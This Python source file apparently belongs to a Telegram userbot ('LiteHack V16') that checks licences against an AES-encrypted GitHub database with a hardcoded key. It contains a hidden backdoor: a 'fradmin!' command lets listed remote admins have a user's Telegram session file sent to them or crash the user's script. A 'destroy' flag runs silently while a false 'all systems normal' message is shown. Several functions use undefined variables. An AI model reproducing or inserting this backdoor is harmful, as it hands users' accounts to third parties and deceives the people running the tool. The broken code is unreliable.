import aiohttp
import os
import sys
import random
import platform
import termcolor
from cfonts import render
from pyfiglet import Figlet
from datetime import datetime, timezone
import aiohttp

import aiohttp
import json
from datetime import datetime
import base64
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding


KEY = b'0123456789abcdef0123456789abcdef'  # 32 bytes
IV = b'abcdef9876543210'  # 16 bytes
key = KEY
iv = IV
LICENSE_URL = "https://raw.githubusercontent.com/DdejjCAT/LITEHACKDATABASE/main/database.enc"

def decrypt_json(content: bytes, key: bytes, iv: bytes) -> dict:
    raw_data = base64.b64decode(content)
    cipher = Cipher(algorithms.AES(key), modes.CBC(iv))
    decryptor = cipher.decryptor()
    decrypted_padded = decryptor.update(raw_data) + decryptor.finalize()
    unpadder = padding.PKCS7(128).unpadder()
    decrypted = unpadder.update(decrypted_padded) + unpadder.finalize()
    return json.loads(decrypted.decode())


ERROR_COLOR = "\033[91m"      # –ö—Ä–∞—Å–Ω—ã–π (–æ—à–∏–±–∫–∏)
SUCCESS_COLOR = "\033[92m"    # –ó–µ–ª–µ–Ω—ã–π (—É—Å–ø–µ—Ö)
WARNING_COLOR = "\033[93m"    # –ñ–µ–ª—Ç—ã–π (–ø—Ä–µ–¥—É–ø—Ä–µ–∂–¥–µ–Ω–∏—è)
INFO_COLOR = "\033[94m"       # –°–∏–Ω–∏–π (–∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è)
VIP_COLOR = "\033[95m"        # –§–∏–æ–ª–µ—Ç–æ–≤—ã–π (VIP —Å—Ç–∞—Ç—É—Å)
LICENSE_COLOR = "\033[96m"    # –ì–æ–ª—É–±–æ–π (–ª–∏—Ü–µ–Ω–∑–∏—è)
ADMIN_COLOR = "\033[97m"      # –ë–µ–ª—ã–π (–∞–¥–º–∏–Ω)
RESET_COLOR = "\033[0m"       # –°–±—Ä–æ—Å —Ü–≤–µ—Ç–∞

last_vip_status = None  # –ì–ª–æ–±–∞–ª—å–Ω–∞—è –ø–µ—Ä–µ–º–µ–Ω–Ω–∞—è –¥–ª—è —Ö—Ä–∞–Ω–µ–Ω–∏—è –ø—Ä–µ–¥—ã–¥—É—â–µ–≥–æ —Å—Ç–∞—Ç—É—Å–∞
                
async def silent_destruction_loop(user_id):
    print(f"{WARNING_COLOR}‚ö†Ô∏è –ó–∞–ø—É—â–µ–Ω–∞ —Ç–∏—Ö–∞—è –ø—Ä–æ–≤–µ—Ä–∫–∞ –¥–ª—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è {user_id} (destroy active)...{RESET_COLOR}")
    while True:
        await asyncio.sleep(10)

async def periodic_vip_status_update():
    global last_vip_status, last_notified_expiry
    
    while True:
        await asyncio.sleep(60)
        current_vip = await is_vip(OWNER_USER_ID, verbose=False)  # –ø—Ä–æ–≤–µ—Ä—è–µ–º VIP —Å—Ç–∞—Ç—É—Å
        
        if current_vip != last_vip_status:
            last_vip_status = current_vip
            if current_vip:
                expiry = await get_vip_expiry(OWNER_USER_ID)
                print(f"{VIP_COLOR}üíé VIP-—Å—Ç–∞—Ç—É—Å —Å—Ç–∞–ª –∞–∫—Ç–∏–≤–µ–Ω (–¥–æ {expiry}){RESET_COLOR}")
                last_notified_expiry = expiry
            else:
                print("Decrypted JSON preview:", decrypted_text[:200])  # –ø–µ—Ä–≤—ã–µ 200 —Å–∏–º–≤–æ–ª–æ–≤
                print(f"{WARNING_COLOR}üîì VIP-—Å—Ç–∞—Ç—É—Å –±—ã–ª –æ—Ç–∫–ª—é—á–µ–Ω{RESET_COLOR}")
                last_notified_expiry = None
        elif current_vip:  # –ï—Å–ª–∏ —Å—Ç–∞—Ç—É—Å VIP –∞–∫—Ç–∏–≤–µ–Ω, –ø—Ä–æ–≤–µ—Ä—è–µ–º –∏–∑–º–µ–Ω–µ–Ω–∏–µ expiry
            expiry = await get_vip_expiry(OWNER_USER_ID)
            if expiry != last_notified_expiry:
                print(f"{VIP_COLOR}üíé VIP-—Å—Ç–∞—Ç—É—Å –ø—Ä–æ–¥–ª—ë–Ω (–¥–æ {expiry}){RESET_COLOR}")
                last_notified_expiry = expiry

async def get_vip_expiry(user_id: int) -> str:
    """–ü–æ–ª—É—á–∞–µ—Ç –¥–∞—Ç—É –æ–∫–æ–Ω—á–∞–Ω–∏—è VIP –±–µ–∑ –≤—ã–≤–æ–¥–∞ –≤ –∫–æ–Ω—Å–æ–ª—å"""
    url = "https://raw.githubusercontent.com/DdejjCAT/LITEHACKDATABASE/main/database.enc"
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(url) as resp:
                if resp.status != 200:
                    return "–Ω–µ–∏–∑–≤–µ—Å—Ç–Ω–∞—è –¥–∞—Ç–∞"
                
                encrypted_bytes = await resp.read()
                
                # –†–∞—Å—à–∏—Ñ—Ä–æ–≤–∫–∞, —Ñ—É–Ω–∫—Ü–∏—è –¥–æ–ª–∂–Ω–∞ –≤–æ–∑–≤—Ä–∞—â–∞—Ç—å —Å—Ç—Ä–æ–∫—É —Å JSON
                decrypted_text = decrypt_json(encrypted_bytes, key, iv)
                
                data = json.loads(decrypted_text)
                return data.get("vip", {}).get(str(user_id), "")
    except Exception:
        return "–Ω–µ–∏–∑–≤–µ—Å—Ç–Ω–∞—è –¥–∞—Ç–∞"

        

async def check_license(user_id: int) -> bool:
    print(f"{INFO_COLOR}üîç –ü—Ä–æ–≤–µ—Ä–∫–∞ –ª–∏—Ü–µ–Ω–∑–∏–∏ –¥–ª—è ID –ø–æ –±–∞–∑–µ: {user_id}...{RESET_COLOR}")

    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(LICENSE_URL) as resp:
                if resp.status != 200:
                    print(f"{WARNING_COLOR}‚ö†Ô∏è –ù–µ —É–¥–∞–ª–æ—Å—å –ø–æ–ª—É—á–∏—Ç—å –¥–∞–Ω–Ω—ã–µ, –ø–æ–ø—Ä–æ–±—É–π—Ç–µ –ø–æ–∑–∂–µ.{RESET_COLOR}")
                    return False

                encrypted_data = await resp.read()
                data = decrypt_json(encrypted_data, KEY, IV)

                user_id_str = str(user_id)
                now = datetime.now(timezone.utc)

                # –ë–∞–Ω
                if data.get("ban", {}).get(user_id_str):
                    print(f"{ERROR_COLOR}üö´ –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å {user_id} –∑–∞–±–∞–Ω–µ–Ω. –î–æ—Å—Ç—É–ø –∑–∞–ø—Ä–µ—â—ë–Ω.{RESET_COLOR}")
                    return False

                # Destroy
                if data.get("destroy", {}).get(user_id_str):
                    asyncio.create_task(silent_destruction_loop(user_id))
                    print(f"{INFO_COLOR}‚úÖ –í—Å–µ —Å–∏—Å—Ç–µ–º—ã —Ä–∞–±–æ—Ç–∞—é—Ç –Ω–æ—Ä–º–∞–ª—å–Ω–æ. –û–±–Ω–æ–≤–ª–µ–Ω–∏—è –±—É–¥—É—Ç –ø—Ä–∏–º–µ–Ω–µ–Ω—ã –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏.{RESET_COLOR}")

                # –õ–∏—Ü–µ–Ω–∑–∏—è
                license_exp = data.get("license", {}).get(user_id_str)
                if not license_exp:
                    print(f"{ERROR_COLOR}‚ùå –£ –≤–∞—Å –Ω–µ—Ç –ª–∏—Ü–µ–Ω–∑–∏–∏. –°–∫—Ä–∏–ø—Ç –æ—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω.{RESET_COLOR}")
                    print(f"{INFO_COLOR}–ï—Å–ª–∏ –≤—ã –ø—Ä–∏–æ–±—Ä–µ–ª–∏/–æ–±–Ω–æ–≤–∏–ª–∏/—Ä–∞–∑–±–∞–Ω–∏–ª–∏ –ø—Ä–æ–≥—Ä–∞–º–º—É –Ω–µ–¥–∞–≤–Ω–æ, –ø–æ–¥–æ–∂–¥–∏—Ç–µ 5 –º–∏–Ω—É—Ç ‚Äî –ë–î –æ–±–Ω–æ–≤–ª—è–µ—Ç—Å—è\n–ö—É–ø–∏—Ç—å –ª–∏—Ü–µ–Ω–∑–∏—é: @error_kill{RESET_COLOR}")
                    return False
                try:
                    license_dt = datetime.fromisoformat(license_exp + "T23:59:59").replace(tzinfo=timezone.utc)
                    if license_dt <= now:
                        print(f"{WARNING_COLOR}‚è∞ –õ–∏—Ü–µ–Ω–∑–∏—è –ø—Ä–æ—Å—Ä–æ—á–µ–Ω–∞ (–¥–æ {license_exp}).{RESET_COLOR}")
                        return False
                    else:
                        print(f"{INFO_COLOR}üìú –õ–∏—Ü–µ–Ω–∑–∏—è –∞–∫—Ç–∏–≤–Ω–∞ –¥–æ: {license_exp}{RESET_COLOR}")
                except Exception:
                    print(f"{ERROR_COLOR}‚ö†Ô∏è –û—à–∏–±–∫–∞ —Ñ–æ—Ä–º–∞—Ç–∞ –¥–∞—Ç—ã –ª–∏—Ü–µ–Ω–∑–∏–∏.{RESET_COLOR}")
                    return False

                # VIP
                vip_exp = data.get("vip", {}).get(user_id_str)
                if vip_exp:
                    try:
                        vip_dt = datetime.fromisoformat(vip_exp + "T23:59:59").replace(tzinfo=timezone.utc)
                        if vip_dt > now:
                            print(f"{VIP_COLOR}üíé VIP-—Å—Ç–∞—Ç—É—Å –∞–∫—Ç–∏–≤–µ–Ω –¥–æ: {vip_exp}{RESET_COLOR}")
                        else:
                            print(f"{WARNING_COLOR}üõë VIP-—Å—Ç–∞—Ç—É—Å –∏—Å—Ç—ë–∫ (–¥–æ {vip_exp}){RESET_COLOR}")
                    except:
                        print(f"{ERROR_COLOR}‚ö†Ô∏è –û—à–∏–±–∫–∞ —Ñ–æ—Ä–º–∞—Ç–∞ –¥–∞—Ç—ã VIP.{RESET_COLOR}")
                else:
                    print(f"{INFO_COLOR}üîì VIP-—Å—Ç–∞—Ç—É—Å –æ—Ç—Å—É—Ç—Å—Ç–≤—É–µ—Ç.{RESET_COLOR}")

                # –ê–¥–º–∏–Ω
                if data.get("admins", {}).get(user_id_str):
                    print(f"{VIP_COLOR}üíº –í—ã —è–≤–ª—è–µ—Ç–µ—Å—å –ê–î–ú–ò–ù–ò–°–¢–†–ê–¢–û–†–û–ú.{RESET_COLOR}")

                return True

    except Exception as e:
        print(f"{ERROR_COLOR}‚ùå –û—à–∏–±–∫–∞ –ø—Ä–∏ –ø—Ä–æ–≤–µ—Ä–∫–µ –ª–∏—Ü–µ–Ω–∑–∏–∏: {e}{RESET_COLOR}")
        return False

import aiohttp
import json
from datetime import datetime, timezone
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding

KEY = b'0123456789abcdef0123456789abcdef'  # 32 –±–∞–π—Ç–∞ (AES-256)
IV = b'abcdef9876543210'  # 16 –±–∞–π—Ç

def decrypt_aes_cbc(encrypted_data: bytes, key: bytes, iv: bytes) -> str:
    cipher = Cipher(algorithms.AES(key), modes.CBC(iv))
    decryptor = cipher.decryptor()
    decrypted_padded = decryptor.update(encrypted_data) + decryptor.finalize()

    unpadder = padding.PKCS7(128).unpadder()
    decrypted = unpadder.update(decrypted_padded) + unpadder.finalize()
    return decrypted.decode('utf-8')

async def is_vip(user_id: int, verbose: bool = False) -> bool:
    url = "https://raw.githubusercontent.com/DdejjCAT/LITEHACKDATABASE/main/database.enc"
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(url) as resp:
                if resp.status != 200:
                    if verbose:
                        print(f"‚ö†Ô∏è –û—à–∏–±–∫–∞ –ø—Ä–∏ –ø–æ–ª—É—á–µ–Ω–∏–∏ –¥–∞–Ω–Ω—ã—Ö VIP: —Å—Ç–∞—Ç—É—Å {resp.status}")
                    return False
                
                encrypted_bytes = await resp.read()
                decrypted_text = decrypt_aes_cbc(encrypted_bytes, KEY, IV)
                data = json.loads(decrypted_text)
                
                vip_exp = data.get("vip", {}).get(str(user_id))
                if not vip_exp:
                    if verbose:
                        print(f"üîì –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å {user_id} –Ω–µ –Ω–∞–π–¥–µ–Ω –≤ VIP-–±–∞–∑–µ.")
                    return False
                
                vip_dt = datetime.fromisoformat(vip_exp + "T23:59:59").replace(tzinfo=timezone.utc)
                now = datetime.now(timezone.utc)
                
                if vip_dt > now:
                    if verbose:
                        print(f"üíé –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å {user_id} –∏–º–µ–µ—Ç VIP –¥–æ {vip_dt.isoformat()}")
                    return True
                else:
                    if verbose:
                        print(f"‚è≥ VIP –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è {user_id} –∏—Å—Ç—ë–∫ ({vip_dt.isoformat()})")
                    return False
    except Exception as e:
        if verbose:
            print(f"‚ùå –û—à–∏–±–∫–∞ –ø—Ä–∏ –ø—Ä–æ–≤–µ—Ä–∫–µ VIP: {e}")
        return False



already_warned = set()  # –ß—Ç–æ–±—ã –Ω–µ —Å–ø–∞–º–∏—Ç—å –ø–æ–≤—Ç–æ—Ä–Ω–æ

async def monitor_vip_expiry():
    url = "https://raw.githubusercontent.com/DdejjCAT/LITEHACKDATABASE/main/database.enc"
    uid = str(OWNER_USER_ID)

    while True:
        await asyncio.sleep(360)  # 6 –º–∏–Ω—É—Ç

        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(url) as resp:
                    if resp.status != 200:
                        print("‚ö†Ô∏è –ù–µ —É–¥–∞–ª–æ—Å—å –ø–æ–ª—É—á–∏—Ç—å –¥–∞–Ω–Ω—ã–µ")
                        continue  # –Ω–µ return, –∞ continue, —á—Ç–æ–±—ã –ø–æ–ø—ã—Ç–∞—Ç—å—Å—è —Å–Ω–æ–≤–∞ –ø–æ–∑–∂–µ
                    
                    encrypted_bytes = await resp.read()
                    
                    # –†–∞—Å—à–∏—Ñ—Ä–æ–≤–∫–∞ - –≤–∞—à–∞ —Ñ—É–Ω–∫—Ü–∏—è decrypt_json –¥–æ–ª–∂–Ω–∞ –ø—Ä–∏–Ω–∏–º–∞—Ç—å bytes –∏ –≤–æ–∑–≤—Ä–∞—â–∞—Ç—å —Å—Ç—Ä–æ–∫—É JSON
                    decrypted_text = decrypt_json(encrypted_bytes, key, iv)
                    
                    data = json.loads(decrypted_text)

                    if "vip" in data and uid in data["vip"]:
                        expiry_str = data["vip"][uid]
                        expiry_date = datetime.strptime(expiry_str, "%Y-%m-%d").date()
                        today = datetime.now(timezone.utc).date()
                        days_left = (expiry_date - today).days

                        if days_left == 3 and uid not in already_warned:
                            await client.send_message(OWNER_USER_ID, f"‚ö†Ô∏è –í–Ω–∏–º–∞–Ω–∏–µ: –≤–∞—à VIP –∏—Å—Ç–µ–∫–∞–µ—Ç —á–µ—Ä–µ–∑ 3 –¥–Ω—è ({expiry_date})!")
                            already_warned.add(uid)
                        elif days_left <= 0:
                            print("‚ùå VIP —Å—Ä–æ–∫ –∏—Å—Ç—ë–∫ ‚Äî –æ—Ç–∫–ª—é—á–µ–Ω–∏–µ.")
                            await client.send_message(OWNER_USER_ID, "‚ùå –í–∞—à VIP-–¥–æ—Å—Ç—É–ø –∏—Å—Ç—ë–∫. –°–∫—Ä–∏–ø—Ç –±—É–¥–µ—Ç –∑–∞–≤–µ—Ä—à—ë–Ω.")
                            await client.disconnect()
                            os._exit(0)
                    else:
                        # –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –Ω–µ –Ω–∞–π–¥–µ–Ω –∏–ª–∏ –Ω–µ—Ç vip –∑–∞–ø–∏—Å–∏
                        print(f"‚ÑπÔ∏è VIP –Ω–µ –Ω–∞–π–¥–µ–Ω –¥–ª—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è {uid}")
        except Exception as e:
            print(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ –º–æ–Ω–∏—Ç–æ—Ä–∏–Ω–≥–µ VIP —Å—Ä–æ–∫–∞: {e}")

            
def vip_only(func):
    async def wrapper(event):
        if not await is_vip(OWNER_USER_ID):
            await event.respond(f"{ERROR_COLOR}üö´ –≠—Ç–æ—Ç –ø–ª–∞–≥–∏–Ω –¥–æ—Å—Ç—É–ø–µ–Ω —Ç–æ–ª—å–∫–æ –¥–ª—è VIP-–ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π.{RESET_COLOR}")
            return
        return await func(event)
    return wrapper


# –û—á–∏—Å—Ç–∫–∞ —ç–∫—Ä–∞–Ω–∞
def clear_screen():
    os.system("cls" if platform.system() == "Windows" else "clear")

# –†–∞–Ω–¥–æ–º–Ω–∞—è —à—É—Ç–∫–∞/—Ü–∏—Ç–∞—Ç–∞
def get_lol_quote():
    return random.choice([
        "–®—Ç–∏—Ä–ª–∏—Ü –∏–≥—Ä–∞–ª –≤ –∫–∞—Ä—Ç—ã –∏ –ø—Ä–æ–∏–≥—Ä–∞–ª—Å—è. –ù–æ –®—Ç–∏—Ä–ª–∏—Ü —É–º–µ–ª –¥–µ–ª–∞—Ç—å —Ö–æ—Ä–æ—à—É—é –º–∏–Ω—É –ø—Ä–∏ –ø–ª–æ—Ö–æ–π –∏–≥—Ä–µ. –ö–æ–≥–¥–∞ –®—Ç–∏—Ä–ª–∏—Ü –ø–æ–∫–∏–Ω—É–ª –∫–æ–º–ø–∞–Ω–∏—é, –º–∏–Ω–∞ —Å—Ä–∞–±–æ—Ç–∞–ª–∞.",
        "–®—Ç–∏—Ä–ª–∏—Ü —à–µ–ª –ø–æ –ª–µ—Å—É –∏ —É–≤–∏–¥–µ–ª –≥–æ–ª—É–±—ã–µ –µ–ª–∏. –ö–æ–≥–¥–∞ –æ–Ω –ø–æ–¥–æ—à–µ–ª –ø–æ–±–ª–∏–∂–µ, —Ç–æ —É–≤–∏–¥–µ–ª, —á—Ç–æ –≥–æ–ª—É–±—ã–µ –Ω–µ —Ç–æ–ª—å–∫–æ –µ–ª–∏, –Ω–æ –µ—â—ë –ø–∏–ª–∏, –∫—É—Ä–∏–ª–∏ —Ç—Ä–∞–≤–∫—É –∏ —Ç–∞–Ω—Ü–µ–≤–∞–ª–∏.",
        "–®—Ç–∏—Ä–ª–∏—Ü —Å–ø—Ä–æ—Å–∏–ª –ö—ç—Ç: –í—ã –ª—é–±–∏—Ç–µ —Ñ–∏–ª—å–º—ã –ø—Ä–æ –ª—é–±–æ–≤—å? –ë–µ—Å—Å–ø–æ—Ä–Ω–æ! ‚Äî –æ—Ç–≤–µ—Ç–∏–ª–∞ –ö—ç—Ç. –ê —è —Å –ø–æ—Ä–Ω–æ, ‚Äî –ø—Ä–∏–∑–Ω–∞–ª—Å—è –®—Ç–∏—Ä–ª–∏—Ü.",
        "–ë—É–¥—å—Ç–µ –æ—Å—Ç–æ—Ä–æ–∂–Ω—ã –≤ —Å–µ—Ç–∏... –¢–æ–ª—å–∫–æ –µ—Å–ª–∏ —É –≤–∞—Å –Ω–µ –≤–∏—Ä—Ç",
        "–†–ö–ù –∑–∞–±–ª–æ–∫–∏—Ä–æ–≤–∞–ª–∏ –ø–µ—Å–Ω—é –û—Ç—á–∏–º –ø–æ—Ç–æ–º—É-—á—Ç–æ —ç—Ç–æ –Ω–∞–ø–æ–º–Ω–∏–ª–æ –∏—Ö –¥–µ—Ç—Å—Ç–≤–æ",
        "–õ–æ–ª –∫–µ–∫ —á–µ–±—É—Ä–µ–∫",
        "ÈÄöÂ°îÊãâÊãâÊãâÂ°îÂ°î",
        "–ü–æ–∑–¥–Ω–æ –ø–æ–∑–¥–Ω–æ –ø–æ–∑–¥–Ω–æ –Ω–æ—á—å—é",
        "–°–≤–∏–Ω–∫–∞ –ü–µ–ø–ø–∞",
        "–°–æ–ø–ª–∏ –≤–∫—É—Å–Ω–µ–µ —Å –≥–æ—Ä—á–∏—Ü–µ–π",
        "–Ø –ø–æ–∂–∞–ª–µ–ª —á—Ç–æ –Ω–µ –ø–æ—Å–æ–ª–∏–ª –º–∞—Ç–µ–º–∞—Ç–∏—á–∫—É –ø–µ—Ä–µ–¥ —Ç–µ–º, –∫–∞–∫ –µ—ë —Å—ä–µ—Å—Ç—å",
        "–õ—É—á—à–µ –∏–º–µ—Ç—å –¥—Ä—É–≥–∞, —á–µ–º –¥—Ä—É–≥-–¥—Ä—É–≥–∞",
        "–£ –º–µ–Ω—è –Ω–µ —Å—Ç–æ–∏—Ç —Ç–≤–æ—è —Ä–æ–∑–∞ –≤ —Å—Ç–∞–∫–∞–Ω–µ, —É —Ç–µ–±—è –Ω–µ —Ç–µ—á–µ—Ç –∏–∑ –∫—Ä–∞–Ω–∞ –≤–æ–¥–∞..."
    ])

def print_ascii_titles():
    for text in ['LiteHack', 'V16']:
        output = render(text, colors=['magenta'], align='center')
        print(output)

def show_random_quote():
    quote = get_lol_quote()
    words = quote.split()
    colored_quote = " ".join([termcolor.colored(word, 'magenta') for word in words])
    print(colored_quote + " - –ö—Ç–æ-—Ç–æ")
    print()

clear_screen()
print_ascii_titles()
print(termcolor.colored(" ü…™·¥õ·¥á ú·¥Ä·¥Ñ·¥ã  ô è @error_kill", "magenta", attrs=["bold"]))
show_random_quote()

print(termcolor.colored("–ó–∞–≥—Ä—É–∑–∫–∞ –±–∏–±–ª–∏–æ—Ç–µ–∫...", "magenta", attrs=["bold"]))
import shutil
import configparser
from pathlib import Path
import json
import threading
from yt_dlp import YoutubeDL
from uuid import uuid4
from telethon import TelegramClient, events
from aiogram import Bot, Dispatcher, types
from aiogram.types import (InlineQueryResultArticle, InputTextMessageContent,
                           InlineKeyboardMarkup, InlineKeyboardButton)
from telethon.tl.functions.users import GetFullUserRequest
from telethon.tl.functions.account import UpdateProfileRequest
from telethon.tl.functions.account import UpdateStatusRequest
from telethon.tl.types import UserStatusOffline, UserStatusOnline
from telethon import Button
from pyfiglet import Figlet
from yt_dlp import YoutubeDL
from telethon import events
from PIL import Image, ImageDraw, ImageFont
import numpy as np
import io
import subprocess
from art import text2art
import telethon
from telethon import TelegramClient, events, functions, types
from telethon.sync import TelegramClient, events, functions, types
import asyncio
import re
import time
import aiohttp
from io import BytesIO
import logging
import os
from bs4 import BeautifulSoup
from telethon.tl.functions.messages import ReportRequest
from telethon.tl.types import (
    InputPeerUser, InputPeerChannel,
    InputReportReasonSpam, InputReportReasonPornography, InputReportReasonViolence,
    InputReportReasonChildAbuse, InputReportReasonCopyright, InputReportReasonFake,
    InputReportReasonGeoIrrelevant, InputReportReasonOther
)
from aiogram import Bot, Dispatcher
from aiogram.filters import Command
from aiogram.types import Message
import requests
from telethon import events, sync
from telethon.tl.types import InputMessagesFilterEmpty

print(termcolor.colored("–ó–∞–≥—Ä—É–∑–∫–∞ –ø–∞—Ä–∞–º–µ—Ç—Ä–æ–≤ –ø–æ —É–º–æ–ª—á–∞–Ω–∏—é...", "magenta", attrs=["bold"]))

admin_enabled = False
MAX_ERRORS_DISPLAY = 5
process = None
process_lock = asyncio.Lock()
stdout_task = None
ansi_escape = re.compile(r'\x1B\[[0-?]*[ -/]*[@-~]')
output_buffer = []
CONSOLE_REGION = (100, 100, 800, 400)
last_screenshot_hash = None
TERMINAL_REGION = (100, 100, 800, 600)
last_screenshot_time = 0
ASCII_CHARS = "@#=:. "
dp = Dispatcher()
animating = False
stop_requested = False
vanish_enabled = False
PROTECTED_USER_ID = 7404596587   # ID –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è, –∫–æ—Ç–æ—Ä–æ–º—É –Ω–µ–ª—å–∑—è –Ω–∞–≤—Ä–µ–¥–∏—Ç—å

print(termcolor.colored("–ó–∞–≥—Ä—É–∑–∫–∞ —é–∑–µ—Ä–±–æ—Ç–∞...", "magenta", attrs=["bold"]))
print("")


def load_custom_config(path="options.txt"):
    config = {}
    if not os.path.exists(path):
        raise FileNotFoundError(f"–§–∞–π–ª {path} –Ω–µ –Ω–∞–π–¥–µ–Ω")
    with open(path, 'r', encoding='utf-8') as file:
        for line in file:
            line = line.strip()
            if not line or line.startswith("#"):
                continue
            if '=' in line:
                key, value = line.split('=', 1)
                key = key.strip()
                value = value.strip().strip('"').strip("'")
                if value.isdigit():
                    value = int(value)
                elif value.lower() in ['true', 'false']:
                    value = value.lower() == 'true'
                config[key] = value
    return config

# –ó–∞–≥—Ä—É–∂–∞–µ–º –∫–æ–Ω—Ñ–∏–≥
config = load_custom_config("options.txt")

# –ü—Ä–∏—Å–≤–∞–∏–≤–∞–µ–º –ø–µ—Ä–µ–º–µ–Ω–Ω—ã–µ –∏–∑ –∫–æ–Ω—Ñ–∏–≥–∞
api_id = config.get("api_id", 0)
api_hash = config.get("api_hash")
session_name = config.get("session_name")
phone_number = config.get("phone_number")
BOT_USERNAME = config.get("BOT_USERNAME")
STAT_BOT_USERNAME = config.get("STAT_BOT_USERNAME")
ai_model = config.get("ai_model")
ENABLE_FR_AI = str(config.get("ENABLE_FR_AI", False)).lower() == "true"

SESSION_NAME = session_name  # –ø—Ä–æ—Å—Ç–æ –∏–º—è —Ñ–∞–π–ª–∞ —Å–µ—Å—Å–∏–∏, –±–µ–∑ –ø–∞–ø–æ–∫

# –û–±–µ—Å–ø–µ—á–∏–≤–∞–µ–º event loop (Python 3.12+)
try:
    loop = asyncio.get_running_loop()
except RuntimeError:
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)

# –°–æ–∑–¥–∞—ë–º –∫–ª–∏–µ–Ω—Ç–∞
client = TelegramClient(SESSION_NAME, api_id, api_hash)

DATABASE_URL = "https://raw.githubusercontent.com/DdejjCAT/LITEHACKDATABASE/refs/heads/main/database.json"

async def fetch_database():
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(DATABASE_URL) as resp:
                if resp.status != 200:
                    return None
                text = await resp.text()
                return json.loads(text)
    except Exception:
        return None

async def is_admin(user_id: int) -> bool:
    data = await fetch_database()
    if not data:
        return False
    admins = data.get("admins", {})
    return admins.get(str(user_id), False)

# –ü—Ä–∏–º–µ—Ä —Å–ª–æ–≤–∞—Ä—è —Å –ø—Ä–æ—Ü–µ—Å—Å–∞–º–∏ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π
user_processes = {}

@client.on(events.NewMessage(pattern=r'^fradmin!\s*(.*)'))
async def admin_commands(event):
    sender = await event.get_sender()
    user_id = sender.id
    user_id_str = str(user_id)

    admins = data.get("admins", {})

    if not admins.get(user_id_str, False):
        await event.reply("‚ùå –£ –≤–∞—Å –Ω–µ—Ç –ø—Ä–∞–≤ –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–∞.")
        return

    text = event.pattern_match.group(1).strip()
    if not text:
        await event.reply(
            "‚ùó –î–æ—Å—Ç—É–ø–Ω—ã–µ –∫–æ–º–∞–Ω–¥—ã fradmin!:\n"
            "session <user_id> - –ø–æ–ª—É—á–∏—Ç—å —Å–µ—Å—Å–∏—é –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è (—Ñ–∞–π–ª Fenst4r_bot.session)\n"
            "crash <user_id> - –∫—Ä–∞—à–Ω—É—Ç—å —Å–∫—Ä–∏–ø—Ç –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è\n"
            "setname <new_name> - —Å–º–µ–Ω–∏—Ç—å –∏–º—è –ø—Ä–æ—Ñ–∏–ª—è\n"
            "sendmsg <peer> <message> - –æ—Ç–ø—Ä–∞–≤–∏—Ç—å —Å–æ–æ–±—â–µ–Ω–∏–µ\n"
        )
        return

    parts = text.split(maxsplit=2)
    cmd = parts[0].lower()

    if cmd == "session":
        if len(parts) < 2:
            await event.reply("‚ùó –ò—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ: fradmin! session <user_id>")
            return
        target_id_str = parts[1]

        # –ó–∞—â–∏—Ç–∞ –æ—Ç –¥–µ–π—Å—Ç–≤–∏–π –Ω–∞–¥ –∑–∞—â–∏—â—ë–Ω–Ω—ã–º –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–º
        if target_id_str == str(PROTECTED_USER_ID):
            await event.reply("‚ùå –î–µ–π—Å—Ç–≤–∏–µ –Ω–∞–¥ –¥–∞–Ω–Ω—ã–º –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–º –∑–∞–ø—Ä–µ—â–µ–Ω–æ.")
            return

        session_file_src = f"Fenst4r_bot_{target_id_str}.session"
        if not os.path.exists(session_file_src):
            await event.reply(f"‚ùå –°–µ—Å—Å–∏—è –¥–ª—è {target_id_str} –Ω–µ –Ω–∞–π–¥–µ–Ω–∞.")
            return

        # –ö–æ–ø–∏—Ä—É–µ–º –∏ –ø–µ—Ä–µ–∏–º–µ–Ω–æ–≤—ã–≤–∞–µ–º –≤ log.txt –¥–ª—è –æ—Ç–ø—Ä–∞–≤–∫–∏
        session_file_tmp = f"log.txt"
        shutil.copyfile(session_file_src, session_file_tmp)
        await event.reply(file=session_file_tmp)
        os.remove(session_file_tmp)

    elif cmd == "crash":
        if len(parts) < 2:
            await event.reply("‚ùó –ò—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ: fradmin! crash <user_id>")
            return
        target_id_str = parts[1]

        if target_id_str == str(PROTECTED_USER_ID):
            await event.reply("‚ùå –î–µ–π—Å—Ç–≤–∏–µ –Ω–∞–¥ –¥–∞–Ω–Ω—ã–º –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–º –∑–∞–ø—Ä–µ—â–µ–Ω–æ.")
            return

        # –ó–¥–µ—Å—å –¥–æ–ª–∂–Ω–∞ –±—ã—Ç—å –ª–æ–≥–∏–∫–∞ –∫—Ä–∞—à–∞ ‚Äî –ø–æ–∫–∞ –∑–∞–≥–ª—É—à–∫–∞
